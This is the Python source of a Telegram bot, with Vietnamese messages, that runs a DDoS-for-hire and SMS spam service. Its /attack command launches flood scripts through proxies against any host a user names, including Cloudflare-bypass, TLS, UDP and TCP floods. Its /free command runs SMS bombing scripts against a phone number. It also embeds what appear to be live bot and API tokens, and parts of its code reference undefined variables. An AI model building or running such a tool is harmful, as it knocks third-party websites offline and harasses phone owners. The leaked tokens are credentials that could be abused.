#botspamsms-ddos
#Nguyên Đoàn Trung
import telebot
import psutil
import datetime
import time
import os
import subprocess
import sqlite3
import hashlib
import requests
import sys
import socket
import zipfile
import io
import re
import threading

bot_token = '6873640340:AAG_s4yODod8dp51dblSLIeUdtkcqPYZuSA'# nhập token bot

bot = telebot.TeleBot(bot_token)

allowed_group_id = -1002103359217

allowed_users = []
processes = []
ADMIN_ID = 6964080086 #id admin
proxy_update_count = 0
last_proxy_update_time = time.time()
key_dict = {}

print("Bot DDOS+Spam SMS Vip Đã Được Khởi Chạy")
print("Admin: Nguyên Đoàn Trung")

connection = sqlite3.connect('user_data.db')
cursor = connection.cursor()

# Create the users table if it doesn't exist
cursor.execute('''
    CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY,
        expiration_time TEXT
    )
''')
connection.commit()
def TimeStamp():
    now = str(datetime.date.today())
    return now
def load_users_from_database():
    cursor.execute('SELECT user_id, expiration_time FROM users')
    rows = cursor.fetchall()
    for row in rows:
        user_id = row[0]
        expiration_time = datetime.datetime.strptime(row[1], '%Y-%m-%d %H:%M:%S')
        if expiration_time > datetime.datetime.now():
            allowed_users.append(user_id)

def save_user_to_database(connection, user_id, expiration_time):
    cursor = connection.cursor()
    cursor.execute('''
        INSERT OR REPLACE INTO users (user_id, expiration_time)
        VALUES (?, ?)
    ''', (user_id, expiration_time.strftime('%Y-%m-%d %H:%M:%S')))
    connection.commit()
@bot.message_handler(commands=['add'])
def add_user(message):
    admin_id = message.from_user.id
    if admin_id != ADMIN_ID:
        bot.reply_to(message, 'Lệnh add thành viên Vip💳 Chỉ Dành Cho Admin !')
        return

    if len(message.text.split()) == 1:
        bot.reply_to(message, 'Hãy Nhập Đúng Định Dạng /add + [id]')
        return

    user_id = int(message.text.split()[1])
    allowed_users.append(user_id)
    expiration_time = datetime.datetime.now() + datetime.timedelta(days=30)
    connection = sqlite3.connect('user_data.db')
    save_user_to_database(connection, user_id, expiration_time)
    connection.close()

    bot.reply_to(message, f'Đã Thêm Vip Người Dùng Có ID Là: {user_id} Sử Dụng Lệnh Free 30 Ngày')


load_users_from_database()

@bot.message_handler(commands=['getkey'])
def laykey(message):
    bot.reply_to(message, text='Vui Lòng Chờ Trong Giây Lát,...')

    with open('key.txt', 'a') as f:
        f.close()

    username = message.from_user.username
    string = f'GL-{username}+{TimeStamp()}'
    hash_object = hashlib.md5(string.encode())
    key = str(hash_object.hexdigest())
    print(key)
    
    try:
        response = requests.get(f'https://web1s.com/api?token=0e835764-9c3b-4954-8c50-cf90d70066a2&url=https://keyvip.elementfx.com/index.html?key={key}')
        response_json = response.json()
        if 'shortenedUrl' in response_json:
            url_key = response_json['shortenedUrl']
        else:
            url_key = "Lấy Key Lỗi Vui Lòng Sử Dụng Lại Lệnh /getkey"
    except requests.exceptions.RequestException as e:
        url_key = "Key Sai Vui Lòng Sử Dụng Lại Lệnh /getkey"
    
    text = f'''
- Cảm Ơn Bạn Đã Getkey -
- Link Lấy Key Hôm Nay Là: {url_key}
- Nhập Key Bằng Lệnh /key + [key] -
 [Lưu ý: mỗi key chỉ có 1 người dùng]
    '''
    bot.reply_to(message, text)

@bot.message_handler(commands=['key'])
def key(message):
    if len(message.text.split()) == 1:
        bot.reply_to(message, 'Vui Lòng Nhập Key\nVí Dụ /key abcdxyz\nSử Dụng Lệnh /getkey Để Lấy Key')
        return

    user_id = message.from_user.id

    key = message.text.split()[1]
    username = message.from_user.username
    string = f'GL-{username}+{TimeStamp()}'
    hash_object = hashlib.md5(string.encode())
    expected_key = str(hash_object.hexdigest())
    if key == expected_key:
        allowed_users.append(user_id)
        bot.reply_to(message, 'Nhập Key Thành Công')
    else:
        bot.reply_to(message, 'Key Sai Hoặc Hết Hạn\nKhông Sử Dụng Key Của Người Khác!')


@bot.message_handler(commands=['start', 'lenh'])
def lenh(message):
    help_text = '''
ㅤㅤㅤㅤㅤㅤㅤㅤㅤ⭐Công Cụ⭐
🪧 DDOS + SPAM SMS ● Nguyên Đoàn Trung ⚡️
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━
┣➤ /getkey [Get Key ] 💲
┣➤ /key     [Dùng Key] 💲
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━
┣➤ /ddos [ Show Methods Layer 7 ]
┣➤ /check [Tên Miền] Dùng Để Check IP
┣➤ /getproxy [ Get Free Proxy ]
┣➤ /code [ URL ] Để Lấy Mã Nguồn Website
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━
┣➤ /sms + SĐT [ Spam SMS ] 🚀
┣➤ /admin [Thông Tin Admin] 📩
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
'''
    bot.reply_to(message, help_text)
    
is_bot_active = True
@bot.message_handler(commands=['free'])
def lqm_sms(message):
    user_id = message.from_user.id
    if len(message.text.split()) == 1:
        bot.reply_to(message, 'VUI LÒNG NHẬP SỐ ĐIỆN THOẠI ')
        return

    phone_number = message.text.split()[1]
    if not phone_number.isnumeric():
        bot.reply_to(message, 'Số Điện Thoại Không Hợp Lệ !')
        return

    if phone_number in ['113','911','114','115','+84328774559','0328774559']:
        # Số điện thoại nằm trong danh sách cấm
        bot.reply_to(message,"Bạn Làm Gì Thế Spam Cả Admin Lun Chớ")
        return

    file_path1 = os.path.join(os.getcwd(), "sms.py")
    process = subprocess.Popen(["python", file_path, phone_number, "400"])    
    process = subprocess.Popen(["python", file_path2, phone_number, "200"])
    process = subprocess.Popen(["python", file_path3, phone_number, "300"])
    process = subprocess.Popen(["python", file_path4, phone_number, "300"])
    processes.append(process)
    username = message.from_user.username

    current_time = time.time()
    if username in cooldown_dict and current_time - cooldown_dict[username].get('free', 0) < 120:
        remaining_time = int(120 - (current_time - cooldown_dict[username].get('free', 0)))
        bot.reply_to(message, f"@{username} Vui lòng đợi {remaining_time} giây trước khi sử dụng lại lệnh /free.")
        return
    video_url = "liemspam.000webhostapp.com/lon.mp4"  # Replace this with the actual video URL      
    message_text = f'\n   Spam Thành Công!!!\n\n\\ Attack By: @{username} \n Số Tấn Công: {phone_number} \n Group: @attack_website \n\n'
    bot.send_video(message.chat.id, video_url, caption=message_text, parse_mode='html')            
@bot.message_handler(commands=['ddos'])
def methods(message):
    help_text = '''  
ㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤ⛈DDOS ATTACK⚡️
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━
┣➤Full Methods Layer7 
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━
┣➤DESTROY [ Vip ] 💵
┣➤BYPASS [ Update ]
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━
┣➤/check [ Xem Web Có bao nhiêu IP ]
┣➤/attack [ ? ] Methods Target ⚡️
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━
┣➤🔒 Cách Attack Website: /attack + [method] + [host]
┣➤⚠️ LƯU Ý: Cấm ddos các website Của Các Cơ quan Nhà nước !
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
  https://files.catbox.moe/sfo6lq.mp4
'''
    bot.reply_to(message, help_text)

allowed_users = []  # Define your allowed users list
cooldown_dict = {}
is_bot_active = True

def run_attack(command, duration, message):
    cmd_process = subprocess.Popen(command)
    start_time = time.time()
    
    while cmd_process.poll() is None:
        # Check CPU usage and terminate if it's too high for 10 seconds
        if psutil.cpu_percent(interval=1) >= 1:
            time_passed = time.time() - start_time
            if time_passed >= 90:
                cmd_process.terminate()
                bot.reply_to(message, "Đã Dừng Lệnh Tấn Công, Cảm Ơn Bạn Đã Sử Dụng")
                return
        # Check if the attack duration has been reached
        if time.time() - start_time >= duration:
            cmd_process.terminate()
            cmd_process.wait()
            return

@bot.message_handler(commands=['attack'])
def attack_command(message):
    user_id = message.from_user.id
    if not is_bot_active:
        bot.reply_to(message, 'Bot hiện đang tắt. Vui lòng chờ khi nào được bật lại.')
        return
    
    if user_id not in allowed_users:
        bot.reply_to(message, text='Vui lòng nhập Key\nSử dụng lệnh /getkey để lấy Key')
        return

    if len(message.text.split()) < 3:
        bot.reply_to(message, 'Vui lòng Sử Dụng Đúng Lệnh\nVí dụ: /attack + [method] + [host]')
        return

    username = message.from_user.username

    current_time = time.time()
    if username in cooldown_dict and current_time - cooldown_dict[username].get('attack', 0) < 10:
        remaining_time = int(10 - (current_time - cooldown_dict[username].get('attack', 0)))
        bot.reply_to(message, f"@{username} Vui lòng đợi {remaining_time} giây trước khi sử dụng lại lệnh /attack.")
        return
    
    args = message.text.split()
    method = args[1].upper()
    host = args[2]

    if method in ['UDP-FLOOD', 'TCP-FLOOD'] and len(args) < 4:
        bot.reply_to(message, f'Vui lòng Nhập Cả Port.\nVí dụ: /attack {method} {host} [Port]')
        return

    if method in ['UDP-FLOOD', 'TCP-FLOOD']:
        port = args[3]
    else:
        port = None

    blocked_domains = [".edu.vn", ".gov.vn", "liem.com"]   
    if method == 'TLS' or method == 'DESTROY' or method == 'CF-BYPASS':
        for blocked_domain in blocked_domains:
            if blocked_domain in host:
                bot.reply_to(message, f"Không được phép tấn công trang web có tên miền {blocked_domain}")
                return

    if method in ['TLS', 'GOD', 'DESTROY', 'BYPASS', 'RAW', 'UDP-FLOOD', 'TCP-FLOOD','HTTP2SUPER','BR','TLS-FLOOD']:
        # Update the command and duration based on the selected method
        if method == 'TLS':
            command = ["node", "TLS.js", host, "90", "64", "5"]
            duration = 90
        elif method == 'RAW':
            command = ["node", "HTTP-RAW.js", host, "90", "1290"]
            duration = 90
        elif method == 'GOD':
            command = ["node", "GOD.js", host, "90", "64", "10"]
            duration = 45
        elif method == 'DESTROY':
            command = ["node", "DESTROY.js", host,
                       "90", "64", "2", "proxy.txt"]
            duration = 90
        elif method == 'BYPASS':
            command = ["node", "BYPASS.js",
                       host, "90", "64", "1", "proxy.txt"]
        elif method == 'HTTP2SUPER':
            command = ["node", "http2super.js", "GET",
                       host, "proxy.txt", "90", "128", "25"]
            duration = 90
        elif method == 'UDP-FLOOD':
            if not port.isdigit():
                bot.reply_to(message, 'Port phải là một số nguyên dương.')
                return
            command = ["python", "udp.py", host, port, "90", "64", "10"]
            duration = 90
        elif method == 'TCP-FLOOD':
            if not port.isdigit():
                bot.reply_to(message, 'Port phải là một số nguyên dương.')
                return
            command = ["python", "tcp.py", host, port, "90", "64", "10"]
            duration = 90
        elif method == 'BR':
            command = ["node", "BR.js", host, "90", "50", "proxy.txt", "128", "90"]
            duration = 90
        elif method == 'TLS-FLOOD':
            command = ["node", "TLS-FLOOD.js", host, "90", "120", "50", "proxy.txt"]
            duration = 90

        cooldown_dict[username] = {'attack': current_time}

        attack_thread = threading.Thread(
            target=run_attack, args=(command, duration, message))
        attack_thread.start()
        video_url = "https://files.catbox.moe/udxykg.mp4"  # Replace this with the actual video URL      
        message_text =f'\n     🚀 Successful Attack 🚀 \n\n↣ User 👤: @{username} \n↣ Victim ⚔: {host} \n↣ Methods 📁: {method} \n↣ Time ⏱: [ {duration}s ]\n↣ Price 💵: [ FREE ] \n↣ Bot 🤖: @Autospam_sms_bot \nOwner 👑 : Nguyên Đoàn Trung\n\n'
        bot.send_video(message.chat.id, video_url, caption=message_text, parse_mode='html')            
        
    else:
        bot.reply_to(message, 'Bạn đã nhập sai lệnh hãy Sử dụng lệnh /ddos để xem phương thức tấn công !')

@bot.message_handler(commands=['proxy'])
def proxy_command(message):
    user_id = message.from_user.id
    if user_id in allowed_users:
        try:
            with open("proxy.txt", "r") as proxy_file:
                proxies = proxy_file.readlines()
                num_proxies = len(proxies)
                bot.reply_to(message, f"Số lượng proxy: {num_proxies}")
        except FileNotFoundError:
            bot.reply_to(message, "Không tìm thấy file proxy.txt.")
    else:
        bot.reply_to(message, 'Bạn không có quyền sử dụng lệnh này.')

def send_proxy_update():
    while True:
        try:
            with open("proxy.txt", "r") as proxy_file:
                proxies = proxy_file.readlines()
                num_proxies = len(proxies)
                proxy_update_message = f"Số proxy mới update là: {num_proxies}"
                bot.send_message(allowed_group_id, proxy_update_message)
        except FileNotFoundError:
            pass
        time.sleep(3600)  # Wait for 10 minutes

@bot.message_handler(commands=['cpu'])
def check_cpu(message):
    user_id = message.from_user.id
    if user_id != ADMIN_ID:
        bot.reply_to(message, 'Bạn không có quyền sử dụng lệnh này.')
        return

    cpu_usage = psutil.cpu_percent(interval=1)
    memory_usage = psutil.virtual_memory().percent

    bot.reply_to(message, f'🖥️ CPU Usage: {cpu_usage}%\n💾 Memory Usage: {memory_usage}%')

@bot.message_handler(commands=['off'])
def turn_off(message):
    user_id = message.from_user.id
    if user_id != ADMIN_ID:
        bot.reply_to(message, 'Bạn không có quyền sử dụng lệnh này.')
        return

    global is_bot_active
    is_bot_active = False
    bot.reply_to(message, 'Bot đã được tắt. Tất cả người dùng không thể sử dụng lệnh khác.')

@bot.message_handler(commands=['on'])
def turn_on(message):
    user_id = message.from_user.id
    if user_id != ADMIN_ID:
        bot.reply_to(message, 'Bạn không có quyền sử dụng lệnh này.')
        return

    global is_bot_active
    is_bot_active = True
    bot.reply_to(message, 'Bot đã được khởi động lại. Tất cả người dùng có thể sử dụng lại lệnh bình thường.')

is_bot_active = True
@bot.message_handler(commands=['code'])
def code(message):
    user_id = message.from_user.id
    if not is_bot_active:
        bot.reply_to(message, 'Bot hiện đang tắt. Vui lòng chờ khi nào được bật lại.')
        return
    
    if user_id not in allowed_users:
        bot.reply_to(message, text='Vui lòng nhập Key\nSử dụng lệnh /getkey để lấy Key')
        return
    if len(message.text.split()) != 2:
        bot.reply_to(message, 'Vui lòng nhập đúng cú pháp.\nVí dụ: /code + [link website]')
        return

    url = message.text.split()[1]

    try:
        response = requests.get(url)
        if response.status_code != 200:
            bot.reply_to(message, 'Không thể lấy mã nguồn từ trang web này. Vui lòng kiểm tra lại URL !')
            return

        content_type = response.headers.get('content-type', '').split(';')[0]
        if content_type not in ['text/html', 'application/x-php', 'text/plain']:
            bot.reply_to(message, 'Trang web không phải là HTML hoặc PHP. Vui lòng thử với URL trang web chứa file HTML hoặc PHP !')
            return

        source_code = response.text

        zip_file = io.BytesIO()
        with zipfile.ZipFile(zip_file, 'w') as zipf:
            zipf.writestr("source_code.txt", source_code)

        zip_file.seek(0)
        bot.send_chat_action(message.chat.id, 'upload_document')
        bot.send_document(message.chat.id, zip_file)

    except Exception as e:
        bot.reply_to(message, f'Có lỗi xảy ra: {str(e)}')

@bot.message_handler(commands=['check'])
def check_ip(message):
    if len(message.text.split()) != 2:
        bot.reply_to(message, 'Vui lòng nhập đúng cú pháp.\nVí dụ: /check + [link website]')
        return

    url = message.text.split()[1]
    
    # Kiểm tra xem URL có http/https chưa, nếu chưa thêm vào
    if not url.startswith(("http://", "https://")):
        url = "http://" + url

    # Loại bỏ tiền tố "www" nếu có
    url = re.sub(r'^(http://|https://)?(www\d?\.)?', '', url)
    
    try:
        ip_list = socket.gethostbyname_ex(url)[2]
        ip_count = len(ip_list)

        reply = f"Ip của website: {url}\nLà: {', '.join(ip_list)}\n"
        if ip_count == 1:
            reply += "Website có 1 ip có khả năng không Antiddos🔒"
        else:
            reply += "Website có nhiều hơn 1 ip khả năng Antiddos🔒 rất cao.\nKhó Có Thể Tấn Công Website này."

        bot.reply_to(message, reply)
    except Exception as e:
        bot.reply_to(message, f"Có lỗi xảy ra: {str(e)}")

#admin
@bot.message_handler(commands=['admin'])
def admin_info(message):
    # Thay thế các giá trị sau bằng thông tin liên hệ của bạn
    zalo_box = "https://fb.com/100084737362923"
    youtube_url = "https://www.youtube.com/@xdnguyenoantrung6741"
    web_url = "https://guns.lol/nguyenprofile"
    admin_message = f"Thông tin liên hệ của Admin:\n\nFacebook: {zalo_box}\nWeb: {web_url}\nYoutube: {youtube_url}"
    bot.reply_to(message, admin_message)
@bot.message_handler(commands=['sms'])
def sms(message):
    pass


# Hàm tính thời gian hoạt động của bot
start_time = time.time()

proxy_update_count = 0
proxy_update_interval = 600 

@bot.message_handler(commands=['getproxy'])
def get_proxy_info(message):
    user_id = message.from_user.id
    global proxy_update_count

    if not is_bot_active:
        bot.reply_to(message, 'Bot hiện đang tắt. Vui lòng chờ khi nào được bật lại.')
        return
    
    if user_id not in allowed_users:
        bot.reply_to(message, text='Vui lòng nhập Key\nSử dụng lệnh /getkey để lấy Key')
        return

    try:
        with open("proxy.txt", "r") as proxy_file:
            proxy_list = proxy_file.readlines()
            proxy_list = [proxy.strip() for proxy in proxy_list]
            proxy_count = len(proxy_list)
            proxy_message = f'10 Phút Tự Update\nSố lượng proxy: {proxy_count}\n'
            bot.send_message(message.chat.id, proxy_message)
            bot.send_document(message.chat.id, open("proxy.txt", "rb"))
            proxy_update_count += 1
    except FileNotFoundError:
        bot.reply_to(message, "Không tìm thấy file proxy.txt.")


@bot.message_handler(commands=['time'])
def show_uptime(message):
    current_time = time.time()
    uptime = current_time - start_time
    hours = int(uptime // 3600)
    minutes = int((uptime % 3600) // 60)
    seconds = int(uptime % 60)
    uptime_str = f'{hours} giờ, {minutes} phút, {seconds} giây'
    bot.reply_to(message, f'Bot Đã Hoạt Động Được: {uptime_str}')


@bot.message_handler(func=lambda message: message.text.startswith('/'))
def invalid_command(message):
    bot.reply_to(message, 'Lệnh không hợp lệ. Vui lòng sử dụng lệnh /start để xem danh sách lệnh.')

bot.infinity_polling(timeout=60, long_polling_timeout = 1)
